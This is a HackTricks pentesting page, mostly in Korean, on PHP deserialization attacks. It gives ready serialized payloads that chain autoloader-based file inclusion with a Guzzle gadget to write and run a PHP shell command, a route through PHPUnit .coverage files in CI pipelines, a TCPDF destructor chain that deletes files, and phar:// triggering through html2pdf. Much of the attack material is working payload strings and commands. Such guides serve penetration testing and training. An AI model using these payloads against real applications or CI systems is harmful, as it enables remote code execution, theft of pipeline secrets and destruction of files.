# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

먼저, [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php)가 무엇인지 확인해야 합니다.

## PHP deserialization + spl_autoload_register + LFI/Gadget

우리는 한 webapp에서 **PHP deserialization**을 발견했지만, **`phpggc`** 안에는 gadgets에 취약한 라이브러리가 **없었습니다**. 그러나 같은 컨테이너에 **different composer webapp with vulnerable libraries**가 있었습니다. 따라서 목표는 다른 webapp의 **load the composer loader of the other webapp**를 로드하고 이를 악용해 deserialization에 취약한 webapp에서 **load a gadget that will exploit that library with a gadget**하는 것이었습니다.

단계:

- 당신은 **deserialization**를 발견했으며 현재 앱 코드에는 **gadget이 전혀 없습니다**
- 다음과 같은 **`spl_autoload_register`** 함수를 악용해 **`.php` 확장자를 가진 로컬 파일을 로드**할 수 있습니다
- 이를 위해 클래스 이름이 **`$name`** 안에 들어가는 deserialization을 사용합니다. 직렬화된 객체의 클래스 이름에는 **"/" 또는 "."를 사용할 수 없지만**, **코드**가 **underscores** ("_")를 **slashes** ("/")로 **대체**합니다. 그래서 `tmp_passwd` 같은 클래스 이름은 `/tmp/passwd.php`로 변환되고 코드가 이를 로드하려 시도합니다.\
A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload 예시</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> If you have a **file upload** and can upload a file with **`.php` extension** you could **abuse this functionality directly** and get already RCE.

In my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with a **library vulnerable to a `phpggc` gadget**.

- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- NOTE: The **generated gadget was not working**, in order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have any values.
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- 이제 우리는 **파일을 생성하고 쓸 수 있습니다**, 하지만 사용자는 **웹 서버 내부의 어떤 폴더에도 쓸 수 없습니다**. 따라서 payload에서 보시다시피, 일부 **base64**와 함께 **`system`**을 호출하는 PHP 파일이 **`/tmp/a.php`**에 생성됩니다. 그런 다음 우리가 LFI로 사용했던 **첫 번째 유형의 payload를 재사용**하여 다른 webapp의 composer loader를 통해 생성된 **`/tmp/a.php`** 파일을 로드할 수 있습니다. 이를 deserialization gadget에 추가하기만 하면 됩니다:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Summary of the payload**

- 같은 컨테이너에 있는 다른 webapp의 **composer autoload**를 로드
- 다른 webapp의 라이브러리를 악용하기 위해 **phpggc gadget**을 로드 (직렬화 취약한 초기 webapp에는 해당 라이브러리의 gadget이 없음)
- 그 gadget은 악의적인 명령을 담은 **PHP payload로 파일을 생성**하여 `/tmp/a.php`에 저장 (webapp 사용자에게는 어느 webapp의 폴더에도 쓰기 권한 없음)
- 페이로드의 마지막 부분은 생성된 php 파일을 로드하여 명령을 실행

이 직렬화는 **두 번 호출해야 했다**. 내 테스트에서는 첫 번째 호출에서 `/tmp/a.php` 파일은 생성되었지만 로드되지 않았고, 두 번째 호출에서야 정상적으로 로드되었다.

### Recent phpggc goodies (2025)

- **phpggc master branch keeps adding chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 등은 2025년에 추가됨 — 타깃 앱이 해당 프로젝트들과 vendor 코드를 공유할 때 유용. 빠른 검색 방법: `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (먼저 clone을 업데이트).
- autoloading을 통해 앱 간에 gadgets를 섞을 때, 대상에서 클래스가 다르게 재선언되면 **gadget 정의의 private properties가 제거될 수 있음**을 기억할 것; payload가 빈 값으로 도착하면 gadget의 `chain.php`를 수정해 속성을 `public`으로 바꿔라 (위와 같은 트릭).

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765)에서는 **PHPT runner**가 생성한 `.coverage` 파일에서 임의의 PHP 객체를 언시리얼라이즈했습니다. 신뢰할 수 없는 기여자가 테스트를 푸시할 수 있는 CI 파이프라인에서는 악성 `.coverage` 파일을 넣는 것만으로 테스트 수트 실행 시 바로 언시리얼라이즈가 발생하므로 웹 접근이 필요 없습니다.

**Attack flow**

1. 테스트 의존성에 존재하는 직렬화된 gadget(예: phpggc의 Monolog 또는 Guzzle chain)을 포함하는 악성 `.coverage` 파일을 repo(또는 artifact)에 배치한다.
2. PR을 제출; CI가 `phpunit --configuration phpunit.xml`을 실행하면 PHPT runner가 coverage 파일을 읽어 gadget을 언시리얼라이즈하여 **RCE inside the runner container**를 획득한다.
3. 테스트가 CI 비밀(클라우드 자격증명, 배포 키 등)을 마운트할 때 특히 위험함.

**Minimal malicious coverage stub** (PHPT 테스트와 함께 배치):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT so phpunit consumes `exploit.coverage`.

## TCPDF `__destruct` POP chain을 통한 임의 파일 삭제

실제 `TCPDF` 인스턴스가 가비지 컬렉션될 때 `_destroy(true)`를 호출하고 `$this->imagekeys`를 반복하며 `K_PATH_CACHE` 아래에 있는 캐시 파일처럼 보이는 항목을 `unlink()`합니다.  
애플리케이션이 `TCPDF` 클래스가 로드된 상태에서 `unserialize($user_data)`를 수행한다면(예: `html` 키를 가진 배열을 기대하는 경우), 다음을 설정한 직렬화된 객체를 제공할 수 있습니다:

- `file_id`를 `self::$cleaned_ids`에 없는 임의의 정수로 설정(예: `-1`).
- `imagekeys`를 `K_PATH_CACHE`로 시작하거나 그렇게 보이게 만들 수 있는 경로로 설정(예: `K_PATH_CACHE`가 `/tmp/`일 때 `/tmp/../tmp/do_not_delete_this_file.txt`).

예제 페이로드 (안전하지 않은 `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` 흐름을 공략):
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
파일은 객체가 스코프에서 벗어나면 즉시 삭제됩니다. TCPDF 6.9.3에서는 검사 조건을 강화하여 `K_PATH_CACHE` 내에서 `__tcpdf_<file_id>_` 접두사가 있는 경로만 제거하도록 했고, 비-`file://` 스킴을 차단하기 위해 `_unlink()`를 도입했습니다. 따라서 구버전의 Producer는 주요 타깃입니다.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0)는 TCPDF를 래핑하고 `src`/`privkey` 속성이 plain `file_exists()`로 검증되는 커스텀 `<cert>` 블록을 노출합니다. PHP < 8.0에서는 `phar://` URL을 건드리는 모든 파일 시스템 함수가 Phar 메타데이터의 역직렬화(unserealize)를 유발합니다. 위에서 설명한 악성 TCPDF 객체를 Phar 아카이브의 메타데이터에 저장하면, 애플리케이션이 자체적으로 `unserialize()`를 호출하지 않더라도 신뢰할 수 있는 POP를 얻을 수 있습니다.

1. `phar.readonly=0`으로 Phar를 제작하고, stub/manifest를 이미지처럼 보이게 설정(e.g. rename `archive.phar` to `archive.png`), 시리얼라이즈된 TCPDF 객체를 Phar 메타데이터에 저장합니다.
2. 파일을 `/tmp/user_files/user_1/archive.png` 같은 접근 가능한 위치에 업로드/배치합니다.
3. `<cert>` 태그를 포함한 HTML을 제출하여 html2pdf가 공격자가 제어하는 경로를 해석하도록 합니다:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
The call to `file_exists()` deserializes the metadata, instantiates TCPDF, and its destructor deletes the chosen file, turning html2pdf into a powerful `phar://` entry point. Version 5.3.1 added `Security::checkValidPath()` to block unapproved schemes, so legacy deployments remain attractive.

## 참고자료

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
